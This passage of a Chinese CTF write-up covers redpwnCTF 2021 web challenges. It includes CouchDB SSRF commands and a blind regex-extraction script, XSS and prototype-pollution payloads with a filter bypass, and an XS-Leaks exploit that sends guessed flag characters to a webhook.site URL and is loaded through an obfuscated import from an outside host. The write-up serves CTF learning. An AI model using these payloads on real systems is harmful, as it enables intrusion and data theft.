  <span style=color:#f92672>]</span>
<span style=color:#f92672>}</span>

$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 <span style=color:#111>|</span> jq
<span style=color:#f92672>{</span>
  <span style=color:#d88200>&#34;_id&#34;</span>: <span style=color:#d88200>&#34;d139bf6ab1733d779f64e9c6c4026de9&#34;</span>,
  <span style=color:#d88200>&#34;_rev&#34;</span>: <span style=color:#d88200>&#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&#34;</span>,
  <span style=color:#d88200>&#34;flag&#34;</span>: <span style=color:#d88200>&#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&#34;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>好耶！复制怪好耶！</p>
<p>虽然上面说了这么多，其实核心思路也挺清晰的，就是先认真分析源码 找出漏洞点是用couchdb创建用户时会自动插入flag 这个过程是使用http请求 我们很容易就可以构造一个url创建用户 让flag进入自己掌控的数据库中，之后就可以顺畅的进行数据库的增删查改；但是这还需要接上题目中给出的testAPI入口才行，又经过一些构造可以成功缝合；但是由于鸡贼的设置 testAPI处的请求只会返回成功或失败，为了确切的得到flag，我们利用了couchdb的_replicator这个好东西来进行一个数据的复制，得到flag~~~</p>
<p>————以下是第二种解法: char-by-char-blind-sqli</p>
<p>源码的分析不变，这是根本，差异之处首先在于构造url时这里利用了couchdb的另一个好东西_find</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -X POST -H <span style=color:#d88200>&#34;Content-Type: application/json&#34;</span> <span style=color:#d88200>&#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find&#39;</span> --data <span style=color:#d88200>&#39;{&#34;selector&#34;:{&#34;flag&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}}&#39;</span>
</code></pre></div><p>本地测试可以成功会显出flag；第二个差异在缝合testAPI的时候，由于filter对于大小写不太敏感，所以大写Couch来绕过了；同样面临回显只有成功或失败 但是char-by-char-blind-sqli无所畏惧~</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>urllib.parse</span>
<span style=color:#f92672>import</span> <span style=color:#111>requests</span>
<span style=color:#f92672>import</span> <span style=color:#111>json</span>
<span style=color:#f92672>import</span> <span style=color:#111>string</span>

<span style=color:#75715e># first, make a request to</span>
<span style=color:#75715e># /createUser?username=strellicsquad&amp;password=12345</span>

<span style=color:#111>alphabet</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;etoanihsrdlucgwyfmpbkvjxqz</span><span style=color:#d88200>{}</span><span style=color:#d88200>_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ&#34;</span>

<span style=color:#00a8c8>def</span> <span style=color:#75af00>test_regex</span><span style=color:#111>(</span><span style=color:#111>regex</span><span style=color:#111>):</span>
    <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find&#34;</span>
    <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>json</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>({</span><span style=color:#d88200>&#34;selector&#34;</span><span style=color:#111>:{</span><span style=color:#d88200>&#34;flag&#34;</span><span style=color:#111>:</span> <span style=color:#111>{</span><span style=color:#d88200>&#34;$regex&#34;</span><span style=color:#111>:</span> <span style=color:#111>regex</span><span style=color:#111>}}})</span>
    <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;https://requester.mc.ax/testAPI/?url=</span><span style=color:#d88200>{</span><span style=color:#111>urllib</span><span style=color:#f92672>.</span><span style=color:#111>parse</span><span style=color:#f92672>.</span><span style=color:#111>quote</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>&amp;method=POST&amp;data=</span><span style=color:#d88200>{</span><span style=color:#111>urllib</span><span style=color:#f92672>.</span><span style=color:#111>parse</span><span style=color:#f92672>.</span><span style=color:#111>quote</span><span style=color:#111>(</span><span style=color:#111>data</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
    <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;Something went wrong&#34;</span> <span style=color:#f92672>in</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span>

<span style=color:#111>flag</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;flag{&#34;</span>
<span style=color:#00a8c8>while</span> <span style=color:#f92672>not</span> <span style=color:#111>flag</span><span style=color:#f92672>.</span><span style=color:#111>endswith</span><span style=color:#111>(</span><span style=color:#d88200>&#34;}&#34;</span><span style=color:#111>):</span>
    <span style=color:#00a8c8>for</span> <span style=color:#111>c</span> <span style=color:#f92672>in</span> <span style=color:#111>alphabet</span><span style=color:#111>:</span>
        <span style=color:#111>check</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;^&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>flag</span> <span style=color:#f92672>+</span> <span style=color:#111>c</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;.*&#34;</span>

        <span style=color:#00a8c8>if</span> <span style=color:#111>test_regex</span><span style=color:#111>(</span><span style=color:#111>check</span><span style=color:#111>):</span>
            <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;found </span><span style=color:#d88200>{</span><span style=color:#111>c</span><span style=color:#d88200>}</span><span style=color:#d88200> -&gt; </span><span style=color:#d88200>{</span><span style=color:#111>flag</span><span style=color:#d88200>}{</span><span style=color:#111>c</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
            <span style=color:#111>flag</span> <span style=color:#f92672>+=</span> <span style=color:#111>c</span>
            <span style=color:#00a8c8>break</span>
</code></pre></div><p>也可以拿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}</p>
<p>————最悲催的莫过于之后我也用docker在本地起了一个环境 但是初始化有问题，导致localhost:5984无法访问</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210720093017634.png alt=image-20210720093017634></p>
<p>我搜了一下 有相关问题的解答 但都不明确……</p>
<p>从这个报错看 应该是说题目相关的需要的database_does_not_exist，但是用于初始化的/_utils也无法访问，直接<code>curl 127.0.0.1:5984</code>也是失败，<code>curl couchdb:5984</code>也是失败，处理报错真是心累</p>
<h2 id=webrequester-strikes-back>web/requester-strikes-back</h2>
<blockquote>
<p>Java was found to not be the future. Can you take down requester again?</p>
</blockquote>
<p>源码处有一处修改<code>if (urlURI.getHost().toLowerCase().contains("couchdb"))</code></p>
<p>这使得我们不能用之前的Couchdb大写的方式来绕过，但是</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155508706.png alt=image-20210806155508706></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155558838.png alt=image-20210806155558838></p>
<p>结合<a href=https://mail-archives.apache.org/mod_mbox/hc-commits/202009.mbox/%3C20200930085030.C135C82908@gitbox.apache.org%3E>Incorrect handling of malformed authority component by URIUtils#extractHost</a></p>
<p>我们只需要把之前的url改成<code>http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find</code>即可（解法二）</p>
<p>解法一直接跑就行 一样能通</p>
<p>相关的一些ssrf前置知识&url解析问题仍然可以看这里：<a href=https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai</a>（好厉害的ppt）</p>
<p>参考：<a href=https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/#requester-strikes-back>wp1</a> <a href=https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester-strikes-back>wp2</a></p>
<h2 id=webpastebin-1>web/pastebin-1</h2>
<blockquote>
<p>Ah, the classic pastebin.</p>
<p><a href=https://pastebin-1.mc.ax/>pastebin-1.mc.ax</a></p>
<p><a href=https://admin-bot.mc.ax/pastebin-1>Admin bot</a></p>
<p>Downloads - <a href=https://static.redpwn.net/uploads/4313574d2348012d122d849530c4f18340644d88ea04f0cbb4932bd35efde1da/main.rs>main.rs</a></p>
</blockquote>
<p>pastebin，类似留言板的样子 可以发表paste</p>
<p>第一反应就是xss，试一下alert(1) 成功弹窗<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093018218.png alt=image-20210710093018218></p>
<p>题目另外提供了一个/admin-bot页面，<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093113748.png alt=image-20210710093113748></p>
<p>这个，妥妥的xss好吧 直接xss platform一把梭！</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094254880.png alt=image-20210710094254880></p>
<h2 id=webpastebin-2-social-edition>***web/pastebin-2-social-edition</h2>
<blockquote>
<p>Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.</p>
<p><a href=https://pastebin-2-social-edition.mc.ax/>pastebin-2-social-edition.mc.ax</a></p>
<p><a href=https://admin-bot.mc.ax/pastebin-2-social-edition>Admin bot</a></p>
</blockquote>
<p>这次adminbot会给自己的paste下面留言回复</p>
<p><img src=https://i.imgur.com/8Vc6Cyf.png alt=8Vc6Cyf.png></p>
<p>显然啊 还是xss，但是用了DOMPurify，并且这个版本也很新 之前的一些bug也没法利用，<a href=https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#pastebin-2-social-edition>参考wp</a></p>
<p>看源码</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806171955901.png alt=image-20210806171955901></p>
<p>注意到这里，如果有错误 就会设置<code>errorContainer.innerHTML = message;</code>，如果我们能控制error message 就能做到xss了；这里利用原型污染prototype pollution，即使DOMPurify可以阻挡一些xss常用的标签或者属性，也阻止不了原型污染</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>form</span><span style=color:#111>&gt;</span>
<span style=color:#111>&lt;</span><span style=color:#f92672>fieldset</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;__proto__&#34;</span><span style=color:#111>&gt;</span>
            <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;error&#34;</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;1&#34;</span> <span style=color:#111>/&gt;</span>
            <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;message&#34;</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;&lt;img src=x onerror=&#39;alert(1)&#39;&gt;&#34;</span> <span style=color:#111>/&gt;</span>
<span style=color:#111>&lt;/</span><span style=color:#f92672>fieldset</span><span style=color:#111>&gt;</span>
<span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;Post Comment&#34;</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;submit&#34;</span> <span style=color:#111>/&gt;</span>
<span style=color:#111>&lt;/</span><span style=color:#f92672>form</span><span style=color:#111>&gt;</span>
</code></pre></div><p>我们可以把error污染成任意值，message污染为xss内容和payload</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>form</span><span style=color:#111>&gt;</span>
<span style=color:#111>&lt;</span><span style=color:#f92672>fieldset</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;__proto__&#34;</span><span style=color:#111>&gt;</span>
            <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;error&#34;</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;1&#34;</span> <span style=color:#111>/&gt;</span>
            <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;message&#34;</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;&lt;img src=x onerror=&#39;alert(1)&#39;&gt;&#34;</span> <span style=color:#111>/&gt;</span>
<span style=color:#111>&lt;/</span><span style=color:#f92672>fieldset</span><span style=color:#111>&gt;</span>
<span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;Post Comment&#34;</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;submit&#34;</span> <span style=color:#111>/&gt;</span>
<span style=color:#111>&lt;/</span><span style=color:#f92672>form</span><span style=color:#111>&gt;</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#111>{}[</span><span style=color:#d88200>&#34;__proto__&#34;</span><span style=color:#111>][</span><span style=color:#d88200>&#34;error&#34;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;1&#34;</span><span style=color:#111>;</span>
<span style=color:#111>{}[</span><span style=color:#d88200>&#34;__proto__&#34;</span><span style=color:#111>][</span><span style=color:#d88200>&#34;message&#34;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&lt;img src=x onerror=&#39;alert(1)&#39;&gt;&#34;</span><span style=color:#111>;</span>
</code></pre></div><p>当请求被触发时，error和message就都是我们自定的值了；虽然DOMPurify会对<code>__proto__</code>进行移除，但是因为上面<code>const fieldsetName = decodeURIComponent(fieldset.name);</code>，所以再对<code>__proto__</code>来一手urlencode就能绕过了</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>form</span><span style=color:#111>&gt;</span>
<span style=color:#111>&lt;</span><span style=color:#f92672>fieldset</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;%255F_proto__&#34;</span><span style=color:#111>&gt;</span>
            <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;error&#34;</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;1&#34;</span> <span style=color:#111>/&gt;</span>
            <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;message&#34;</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;&lt;img src=x onerror=&#39;alert(1)&#39;&gt;&#34;</span> <span style=color:#111>/&gt;</span>
<span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;Post Comment&#34;</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;submit&#34;</span> <span style=color:#111>/&gt;</span>
<span style=color:#111>&lt;/</span><span style=color:#f92672>fieldset</span><span style=color:#111>&gt;</span>
<span style=color:#111>&lt;/</span><span style=color:#f92672>form</span><span style=color:#111>&gt;</span>
</code></pre></div><h2 id=webpastebin-3>***web/pastebin-3</h2>
<blockquote>
<p>Boy, there sure are a lot of pastebins. Gotta think of new themes&mldr;</p>
<p><em>Please put a reasonably secure password when making an account</em></p>
</blockquote>
<p>还是一个很简单的页面 create paste，增加了一个搜索的功能</p>
<p>先看/view路由</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142853227.png alt=image-20210808142853227></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141859178.png alt=image-20210808141859178></p>
<p>我们的便签 总体会以一个url的形式放入iframe中，接着去看看sanbox_url的渲染情况</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141709394.png alt=image-20210808141709394></p>
<p>而亮点是，我们的paste又被直接放入反引号中间了，如果我们用类似<code>${alert(1)}</code>的东西直接就可以跑js了！</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142359209.png alt=image-20210808142359209></p>
<p>现在我们有了可以操作js代码的地方——但是这是在sandbox中，与主页面并不是同源的🤔</p>
<p>再看看新加入的search功能</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808143003626.png alt=image-20210808143003626></p>
<p>————这里要先插播一条知识了 <a href=https://xsleaks.dev/>XSLeaks</a>（更多的相关参考链接放到后面了），一个常见的xsleak攻击详见<a href=https://xsleaks.dev/docs/attacks/error-events/>error events</a></p>
<p><em>Cross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. ——from XSLeaks wiki</em></p>
<p>/search使用的是flask中的flash()消息闪现来展示搜索的结果，它会存储在session cookie中，如果消息比会话cookie大的话会导致消息闪现静默失败——我们利用这一条特性，用长长的cookie，如果请求成功 那么需要显示flash时cookie将会超过限制报错，而请求失败 就只有No results found短短的一条，不会报400</p>
<p>我们用XSLeaks wiki上给出的 probeError snippet</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>function</span> <span style=color:#75af00>probeError</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span> <span style=color:#111>{</span>
  <span style=color:#00a8c8>let</span> <span style=color:#75af00>script</span> <span style=color:#f92672>=</span> <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>createElement</span><span style=color:#111>(</span><span style=color:#d88200>&#39;script&#39;</span><span style=color:#111>);</span>
  <span style=color:#75af00>script</span><span style=color:#111>.</span><span style=color:#75af00>src</span> <span style=color:#f92672>=</span> <span style=color:#75af00>url</span><span style=color:#111>;</span>
  <span style=color:#75af00>script</span><span style=color:#111>.</span><span style=color:#75af00>onload</span> <span style=color:#f92672>=</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Onload event triggered&#39;</span><span style=color:#111>);</span>
  <span style=color:#75af00>script</span><span style=color:#111>.</span><span style=color:#75af00>onerror</span> <span style=color:#f92672>=</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Error event triggered&#39;</span><span style=color:#111>);</span>
  <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>head</span><span style=color:#111>.</span><span style=color:#75af00>appendChild</span><span style=color:#111>(</span><span style=color:#75af00>script</span><span style=color:#111>);</span>
<span style=color:#111>}</span>
</code></pre></div><p>虽然同站的cookies（same-site cookies）通常会阻止这种情况，但由于题中的sandbox是子域，并不是同站的情况，所以probeError可以检测到，下面是脚本</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>const</span> <span style=color:#75af00>alphabet</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span style=color:#111>;</span>

<span style=color:#00a8c8>function</span> <span style=color:#75af00>set</span><span style=color:#111>()</span> <span style=color:#111>{</span>
    <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>cookie</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`a=</span><span style=color:#d88200>${</span><span style=color:#d88200>&#39;a&#39;</span><span style=color:#111>.</span><span style=color:#75af00>repeat</span><span style=color:#111>(</span><span style=color:#ae81ff>4096</span><span style=color:#f92672>-</span><span style=color:#ae81ff>90</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>; domain=.pastebin-3.mc.ax`</span>
    <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>cookie</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`b=</span><span style=color:#d88200>${</span><span style=color:#d88200>&#39;a&#39;</span><span style=color:#111>.</span><span style=color:#75af00>repeat</span><span style=color:#111>(</span><span style=color:#ae81ff>4096</span><span style=color:#f92672>-</span><span style=color:#ae81ff>90</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>; domain=.pastebin-3.mc.ax`</span>
<span style=color:#111>}</span>

<span style=color:#00a8c8>function</span> <span style=color:#75af00>unset</span><span style=color:#111>()</span> <span style=color:#111>{</span>
    <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>cookie</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`a=; domain=.pastebin-3.mc.ax`</span>
    <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>cookie</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`b=; domain=.pastebin-3.mc.ax`</span>
<span style=color:#111>}</span>

<span style=color:#00a8c8>function</span> <span style=color:#75af00>probeError</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span> <span style=color:#111>{</span>
    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Promise</span><span style=color:#111>(</span><span style=color:#75af00>resolve</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
        <span style=color:#00a8c8>let</span> <span style=color:#75af00>script</span> <span style=color:#f92672>=</span> <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>createElement</span><span style=color:#111>(</span><span style=color:#d88200>&#39;script&#39;</span><span style=color:#111>);</span>
        <span style=color:#75af00>script</span><span style=color:#111>.</span><span style=color:#75af00>src</span> <span style=color:#f92672>=</span> <span style=color:#75af00>url</span><span style=color:#111>;</span>
        <span style=color:#75af00>script</span><span style=color:#111>.</span><span style=color:#75af00>onload</span> <span style=color:#f92672>=</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>resolve</span><span style=color:#111>(</span><span style=color:#00a8c8>false</span><span style=color:#111>);</span>
        <span style=color:#75af00>script</span><span style=color:#111>.</span><span style=color:#75af00>onerror</span> <span style=color:#f92672>=</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>resolve</span><span style=color:#111>(</span><span style=color:#00a8c8>true</span><span style=color:#111>);</span>
        <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>head</span><span style=color:#111>.</span><span style=color:#75af00>appendChild</span><span style=color:#111>(</span><span style=color:#75af00>script</span><span style=color:#111>);</span>
    <span style=color:#111>});</span>
<span style=color:#111>}</span>

<span style=color:#00a8c8>function</span> <span style=color:#75af00>wait</span><span style=color:#111>(</span><span style=color:#75af00>time</span><span style=color:#111>)</span> <span style=color:#111>{</span>
    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Promise</span><span style=color:#111>(</span><span style=color:#75af00>resolve</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
        <span style=color:#75af00>setTimeout</span><span style=color:#111>(</span><span style=color:#75af00>resolve</span><span style=color:#111>,</span> <span style=color:#75af00>time</span><span style=color:#111>);</span>
    <span style=color:#111>});</span>
<span style=color:#111>}</span>

<span style=color:#111>(</span><span style=color:#00a8c8>async</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
    <span style=color:#00a8c8>let</span> <span style=color:#75af00>prefix</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;flag{c00k13_b0mb1n6_15_f4k3_vu&#34;</span><span style=color:#111>;</span>
    <span style=color:#75af00>set</span><span style=color:#111>();</span>
    <span style=color:#75af00>navigator</span><span style=color:#111>.</span><span style=color:#75af00>sendBeacon</span><span style=color:#111>(</span><span style=color:#d88200>&#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded&#39;</span><span style=color:#111>);</span>
    <span style=color:#00a8c8>while</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>prefix</span><span style=color:#111>.</span><span style=color:#75af00>endsWith</span><span style=color:#111>(</span><span style=color:#d88200>&#39;}&#39;</span><span style=color:#111>))</span> <span style=color:#111>{</span>
        <span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#00a8c8>let</span> <span style=color:#75af00>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#75af00>alphabet</span><span style=color:#111>.</span><span style=color:#75af00>length</span><span style=color:#111>;</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span><span style=color:#111>)</span> <span style=color:#111>{</span>
            <span style=color:#00a8c8>let</span> <span style=color:#75af00>attempt</span> <span style=color:#f92672>=</span> <span style=color:#75af00>prefix</span> <span style=color:#f92672>+</span> <span style=color:#75af00>alphabet</span><span style=color:#111>[</span><span style=color:#75af00>i</span><span style=color:#111>];</span>

            <span style=color:#00a8c8>let</span> <span style=color:#75af00>subwindow</span> <span style=color:#f92672>=</span> <span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>open</span><span style=color:#111>(</span><span style=color:#d88200>&#34;https://pastebin-3.mc.ax/search?query=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>encodeURIComponent</span><span style=color:#111>(</span><span style=color:#75af00>attempt</span><span style=color:#111>));</span>
            <span style=color:#00a8c8>await</span> <span style=color:#75af00>wait</span><span style=color:#111>(</span><span style=color:#ae81ff>500</span><span style=color:#111>);</span>
            <span style=color:#75af00>subwindow</span><span style=color:#111>.</span><span style=color:#75af00>close</span><span style=color:#111>();</span>

            <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#00a8c8>await</span> <span style=color:#75af00>probeError</span><span style=color:#111>(</span><span style=color:#d88200>&#34;https://pastebin-3.mc.ax/home&#34;</span><span style=color:#111>))</span> <span style=color:#111>{</span>
                <span style=color:#75af00>navigator</span><span style=color:#111>.</span><span style=color:#75af00>sendBeacon</span><span style=color:#111>(</span><span style=color:#d88200>&#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?&#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>attempt</span><span style=color:#111>);</span>
                <span style=color:#75af00>unset</span><span style=color:#111>();</span>
                <span style=color:#75af00>prefix</span> <span style=color:#f92672>=</span> <span style=color:#75af00>attempt</span><span style=color:#111>;</span>
                <span style=color:#00a8c8>break</span><span style=color:#111>;</span>
            <span style=color:#111>}</span>
        <span style=color:#111>}</span>
    <span style=color:#111>}</span>
<span style=color:#111>})();</span>
</code></pre></div><p>为了引入这个脚本，我们新建一个paste</p>
<pre tabindex=0><code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
</code></pre><p>其他几个版本的脚本：<a href=https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037>ver2</a> <a href=https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a>ver3</a></p>
<p>参考：<a href=https://xsleaks.dev/>XSLeaks</a> | <a href=https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf>Side Channel Vulnerabilities on the Web - Detection and Preventio</a> | <a href=https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html>Flask 消息闪现</a></p>
<h2 id=webwtjs>web/wtjs</h2>
<blockquote>
<p>Ya like golf? How about JS golf?</p>
<p><a href=https://wtjs.mc.ax/>wtjs.mc.ax</a> | <a href=https://admin-bot.mc.ax/wtjs>Admin bot</a></p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/fb14645b75d85a5243bc734b968756485e25c3a1bcb969662a50de2a13982dcf/wtjs.tar>wtjs.tar</a></p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710163120317.png alt=image-20210710163120317></p>
<p>………………有字数限制的fuckjs，我不会构造 太痛苦了</p>
